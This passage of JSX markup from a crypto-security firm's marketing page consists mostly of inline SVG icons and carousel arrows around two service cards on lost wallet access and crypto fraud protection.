                                          d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                          fill="#3939EF"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_65839">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="translate(0.507812 0.273438)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                </div>
                                <div className="cards mobile_card">
                                  <div className="card">
                                    <div className="top_content">
                                      <svg
                                        width={61}
                                        height={61}
                                        viewBox="0 0 61 61"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <rect
                                          x="24.6677"
                                          y="1.22934"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="9.47522"
                                          y="9.28903"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="32.8005"
                                          y="1.22934"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="48.0661"
                                          y="9.28903"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="1.25104"
                                          y="24.5546"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="56.1989"
                                          y="24.5546"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="1.25104"
                                          y="32.6875"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="9.47522"
                                          y="47.9531"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="24.6677"
                                          y="55.9763"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="32.8005"
                                          y="55.9763"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="56.1989"
                                          y="32.6875"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                        <rect
                                          x="48.0661"
                                          y="47.9531"
                                          width="3.75"
                                          height="3.75"
                                          rx="1.875"
                                          fill="white"
                                        />
                                      </svg>
                                    </div>
                                    <div className="bottom_content">
                                      <h3 className="title">Lost access</h3>
                                      <p className="description text-size-medium">
                                        We provide a secure way for you to
                                        recover your wallet keys. Think of us as
                                        a safety net for your business assets
                                        and customer holdings.
                                      </p>
                                      <div className="button_wrapper">
                                        <a
                                          className="blue_btn_with_arrow"
                                          href="https://www.coincover.com/risks/lost-wallet-access"
                                        >
                                          <span>Learn more</span>
                                        </a>
                                      </div>
                                    </div>
                                  </div>
                                  <div className="card">
                                    <div className="top_content">
                                      <svg
                                        width={60}
                                        height={61}
                                        viewBox="0 0 60 61"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <path
                                          d="M30 4.94978C31.1835 4.94978 32.1429 3.99039 32.1429 2.80692C32.1429 1.62345 31.1835 0.664062 30 0.664062C28.8165 0.664062 27.8571 1.62345 27.8571 2.80692C27.8571 3.99039 28.8165 4.94978 30 4.94978Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M2.14286 32.8069C3.32632 32.8069 4.28571 31.8475 4.28571 30.6641C4.28571 29.4806 3.32632 28.5212 2.14286 28.5212C0.95939 28.5212 0 29.4806 0 30.6641C0 31.8475 0.95939 32.8069 2.14286 32.8069Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M2.14286 42.0926C3.32632 42.0926 4.28571 41.1332 4.28571 39.9498C4.28571 38.7663 3.32632 37.8069 2.14286 37.8069C0.95939 37.8069 0 38.7663 0 39.9498C0 41.1332 0.95939 42.0926 2.14286 42.0926Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M4.28571 49.2355C4.28571 50.419 3.32632 51.3783 2.14286 51.3783C0.95939 51.3783 0 50.419 0 49.2355C0 48.052 0.95939 47.0926 2.14286 47.0926C3.32632 47.0926 4.28571 48.052 4.28571 49.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 2.80692C41.4286 3.99039 40.4692 4.94978 39.2857 4.94978C38.1023 4.94978 37.1429 3.99039 37.1429 2.80692C37.1429 1.62345 38.1023 0.664062 39.2857 0.664062C40.4692 0.664062 41.4286 1.62345 41.4286 2.80692Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M30 23.5212C31.1835 23.5212 32.1429 22.5618 32.1429 21.3783C32.1429 20.1949 31.1835 19.2355 30 19.2355C28.8165 19.2355 27.8571 20.1949 27.8571 21.3783C27.8571 22.5618 28.8165 23.5212 30 23.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M32.1429 58.5212C32.1429 59.7047 31.1835 60.6641 30 60.6641C28.8165 60.6641 27.8571 59.7047 27.8571 58.5212C27.8571 57.3377 28.8165 56.3783 30 56.3783C31.1835 56.3783 32.1429 57.3377 32.1429 58.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M20.7143 4.94978C21.8978 4.94978 22.8571 3.99039 22.8571 2.80692C22.8571 1.62345 21.8978 0.664062 20.7143 0.664062C19.5308 0.664062 18.5714 1.62345 18.5714 2.80692C18.5714 3.99039 19.5308 4.94978 20.7143 4.94978Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M22.8571 21.3783C22.8571 22.5618 21.8978 23.5212 20.7143 23.5212C19.5308 23.5212 18.5714 22.5618 18.5714 21.3783C18.5714 20.1949 19.5308 19.2355 20.7143 19.2355C21.8978 19.2355 22.8571 20.1949 22.8571 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M20.7143 60.6641C21.8978 60.6641 22.8571 59.7047 22.8571 58.5212C22.8571 57.3377 21.8978 56.3783 20.7143 56.3783C19.5308 56.3783 18.5714 57.3377 18.5714 58.5212C18.5714 59.7047 19.5308 60.6641 20.7143 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M60 30.6641C60 31.8475 59.0406 32.8069 57.8571 32.8069C56.6737 32.8069 55.7143 31.8475 55.7143 30.6641C55.7143 29.4806 56.6737 28.5212 57.8571 28.5212C59.0406 28.5212 60 29.4806 60 30.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M57.8571 42.0926C59.0406 42.0926 60 41.1332 60 39.9498C60 38.7663 59.0406 37.8069 57.8571 37.8069C56.6737 37.8069 55.7143 38.7663 55.7143 39.9498C55.7143 41.1332 56.6737 42.0926 57.8571 42.0926Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M60 49.2355C60 50.419 59.0406 51.3783 57.8571 51.3783C56.6737 51.3783 55.7143 50.419 55.7143 49.2355C55.7143 48.052 56.6737 47.0926 57.8571 47.0926C59.0406 47.0926 60 48.052 60 49.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M11.4286 14.2355C12.612 14.2355 13.5714 13.2761 13.5714 12.0926C13.5714 10.9092 12.612 9.94978 11.4286 9.94978C10.2451 9.94978 9.28571 10.9092 9.28571 12.0926C9.28571 13.2761 10.2451 14.2355 11.4286 14.2355Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M13.5714 21.3783C13.5714 22.5618 12.612 23.5212 11.4286 23.5212C10.2451 23.5212 9.28571 22.5618 9.28571 21.3783C9.28571 20.1949 10.2451 19.2355 11.4286 19.2355C12.612 19.2355 13.5714 20.1949 13.5714 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M11.4286 60.6641C12.612 60.6641 13.5714 59.7047 13.5714 58.5212C13.5714 57.3377 12.612 56.3783 11.4286 56.3783C10.2451 56.3783 9.28571 57.3377 9.28571 58.5212C9.28571 59.7047 10.2451 60.6641 11.4286 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 21.3783C41.4286 22.5618 40.4692 23.5212 39.2857 23.5212C38.1023 23.5212 37.1429 22.5618 37.1429 21.3783C37.1429 20.1949 38.1023 19.2355 39.2857 19.2355C40.4692 19.2355 41.4286 20.1949 41.4286 21.3783Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.5714 23.5212C49.7549 23.5212 50.7143 22.5618 50.7143 21.3783C50.7143 20.1949 49.7549 19.2355 48.5714 19.2355C47.388 19.2355 46.4286 20.1949 46.4286 21.3783C46.4286 22.5618 47.388 23.5212 48.5714 23.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M41.4286 58.5212C41.4286 59.7047 40.4692 60.6641 39.2857 60.6641C38.1023 60.6641 37.1429 59.7047 37.1429 58.5212C37.1429 57.3377 38.1023 56.3783 39.2857 56.3783C40.4692 56.3783 41.4286 57.3377 41.4286 58.5212Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.5714 60.6641C49.7549 60.6641 50.7143 59.7047 50.7143 58.5212C50.7143 57.3377 49.7549 56.3783 48.5714 56.3783C47.388 56.3783 46.4286 57.3377 46.4286 58.5212C46.4286 59.7047 47.388 60.6641 48.5714 60.6641Z"
                                          fill="white"
                                        />
                                        <path
                                          d="M48.6429 14.2355C49.8263 14.2355 50.7857 13.2761 50.7857 12.0926C50.7857 10.9092 49.8263 9.94978 48.6429 9.94978C47.4594 9.94978 46.5 10.9092 46.5 12.0926C46.5 13.2761 47.4594 14.2355 48.6429 14.2355Z"
                                          fill="white"
                                        />
                                      </svg>
                                    </div>
                                    <div className="bottom_content">
                                      <h3 className="title">Crypto fraud</h3>
                                      <p className="description text-size-medium">
                                        Ransomware. Account takeovers. Social
                                        engineering. Our crypto cybersecurity
                                        protects your business and customers
                                        against sophisticated cyber attacks.
                                      </p>
                                      <div className="button_wrapper">
                                        <a
                                          className="blue_btn_with_arrow"
                                          href="https://www.coincover.com/risks/crypto-fraud"
                                        >
                                          <span>Learn more</span>
                                        </a>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="custom_arrow arrowsFor_large">
                                  <div className="prev-arrow">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_63494)">
                                        <path
                                          d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                          fill="#A6ADBA"
                                        />
                                        <path
                                          d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                          fill="#A6ADBA"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_63494">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                  <div className="next-arrow">
                                    <svg
                                      width={20}
                                      height={20}
                                      viewBox="0 0 20 20"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_1981_65839)">
                                        <path
                                          d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                          fill="#3939EF"
                                        />
                                        <path
                                          d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                          fill="#3939EF"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_1981_65839">
                                          <rect
                                            width="18.9856"
                                            height={19}
                                            fill="white"
                                            transform="translate(0.507812 0.273438)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-13 dnd-section dnd_area-row-6-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-14 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748893477042"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="threeColumnCards_Wrapper">
                              <div className="content-wrapper">
                                <div className="content_section ">
                                  <div className="heading">
                                    <h2>You might also like</h2>
                                  </div>
                                  <div className="right-content">
                                    <div className="custom_arrows_section desktop_view">
                                      <div className="prev_slide">
                                        <svg
                                          width={20}
                                          height={20}
                                          viewBox="0 0 20 20"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2048_64905)">
                                            <path
                                              d="M9.99304 0.500485C10.1372 0.500485 10.2669 0.529317 10.4111 0.58698C10.5408 0.644644 10.6562 0.716722 10.7571 0.817633C10.9589 1.01945 11.0742 1.29335 11.0742 1.58167C11.0742 1.72583 11.0454 1.86998 10.9877 1.99973C10.9301 2.12947 10.858 2.2448 10.7571 2.34571C10.3534 2.74935 9.63264 2.74935 9.229 2.34571C9.02718 2.14389 8.91185 1.86998 8.91185 1.58167C8.91185 1.29335 9.02718 1.01945 9.229 0.817633C9.43082 0.615812 9.70472 0.500485 9.99304 0.500485Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M7.95989 3.62856C8.37795 4.04661 8.37795 4.72416 7.95989 5.15663C7.52742 5.57469 6.84988 5.57469 6.43182 5.15663C5.99935 4.73857 5.99935 4.04661 6.43182 3.62856C6.64806 3.41232 6.92196 3.31141 7.19586 3.31141C7.48417 3.31141 7.75807 3.41232 7.97431 3.62856H7.95989ZM5.14882 6.42522C5.56687 6.85769 5.56687 7.53523 5.14882 7.96771C4.73076 8.38576 4.0388 8.38576 3.62074 7.96771C3.20269 7.53523 3.20269 6.85769 3.62074 6.42522C3.83698 6.2234 4.11088 6.12249 4.38478 6.12249C4.65868 6.12249 4.93258 6.2234 5.14882 6.42522Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M1.58679 8.91455C1.86068 8.91455 2.149 9.02988 2.35082 9.2317C2.55264 9.43352 2.66797 9.72183 2.66797 9.99573C2.66797 10.1399 2.63914 10.284 2.58147 10.4138C2.52381 10.5435 2.45173 10.6589 2.35082 10.7598C1.94718 11.1634 1.22639 11.1634 0.822749 10.7598C0.620928 10.5579 0.505601 10.284 0.505601 9.99573C0.505601 9.70742 0.620928 9.43352 0.822749 9.2317C1.02457 9.02988 1.29847 8.91455 1.58679 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M5.14761 12.0426C5.56567 12.4607 5.56567 13.1526 5.14761 13.5707C4.71513 13.9887 4.03759 13.9887 3.61953 13.5707C3.18706 13.1526 3.20148 12.4607 3.61953 12.0426C3.83577 11.8264 4.10967 11.7255 4.38357 11.7255C4.65747 11.7255 4.93137 11.8264 5.14761 12.0426ZM7.94427 14.8537C8.36233 15.2718 8.36233 15.9493 7.94427 16.3818C7.52621 16.7998 6.83425 16.7998 6.4162 16.3818C5.99814 15.9493 5.99814 15.2718 6.4162 14.8537C6.63243 14.6375 6.90633 14.5365 7.18023 14.5365C7.45413 14.5365 7.72803 14.6375 7.94427 14.8537Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M9.97741 17.3348C10.1216 17.3348 10.2657 17.3637 10.3955 17.4213C10.5252 17.479 10.6405 17.5655 10.7414 17.652C10.9433 17.8538 11.0586 18.1421 11.0586 18.4304C11.0586 18.7187 10.9433 18.9926 10.7414 19.1945C10.6405 19.281 10.5252 19.3675 10.3955 19.4251C9.99183 19.5837 9.5161 19.4828 9.21337 19.1945C9.01155 18.9926 8.89623 18.7043 8.89623 18.4304C8.89623 18.1421 9.01155 17.8538 9.21337 17.652C9.41519 17.4502 9.68909 17.3348 9.97741 17.3348Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M18.411 8.91455C18.6849 8.91455 18.9732 9.02988 19.175 9.2317C19.3769 9.43352 19.4922 9.72183 19.4922 9.99573C19.4922 10.284 19.3769 10.5724 19.175 10.7598C18.7714 11.1634 18.0362 11.1634 17.647 10.7598C17.4451 10.5724 17.3298 10.284 17.3298 9.99573C17.3298 9.70742 17.4451 9.43352 17.647 9.2317C17.8488 9.02988 18.1227 8.91455 18.411 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M12.0241 9.99694C12.0241 10.6024 11.534 11.0781 10.9429 11.0781C10.3519 11.0781 9.86176 10.6024 9.86176 9.99694C9.86176 9.40589 10.3519 8.91576 10.9429 8.91576C11.534 8.91576 12.0241 9.40589 12.0241 9.99694ZM15.7578 9.99694C15.7578 10.6024 15.2677 11.0781 14.6766 11.0781C14.0712 11.0781 13.5954 10.6024 13.5954 9.99694C13.5954 9.40589 14.0712 8.91576 14.6766 8.91576C15.2677 8.91576 15.7578 9.40589 15.7578 9.99694Z"
                                              fill="#DFE4EC"
                                            />
                                            <path
                                              d="M7.21178 8.91455C7.5001 8.91455 7.774 9.02988 7.97582 9.2317C8.17764 9.43352 8.29297 9.72183 8.29297 9.99573C8.29297 10.284 8.17764 10.5724 7.97582 10.7598C7.57218 11.1634 6.85139 11.1634 6.44775 10.7598C6.24593 10.5724 6.1306 10.284 6.1306 9.99573C6.1306 9.70742 6.24593 9.43352 6.44775 9.2317C6.64957 9.02988 6.92347 8.91455 7.21178 8.91455Z"
                                              fill="#DFE4EC"
                                            />
                                          </g>
                                          <defs>
                                            <clipPath id="clip0_2048_64905">
                                              <rect
                                                width="18.9856"
                                                height={19}
                                                fill="white"
                                                transform="matrix(-1 0 0 -1 19.4922 19.5)"
                                              />
                                            </clipPath>
                                          </defs>
                                        </svg>
                                      </div>
                                      <div className="next_slide">
                                        <svg
                                          width={20}
                                          height={20}
                                          viewBox="0 0 20 20"
                                          fill="none"
                                          xmlns="http://www.w3.org/2000/svg"
                                        >
                                          <g clipPath="url(#clip0_2048_64919)">
                                            <path
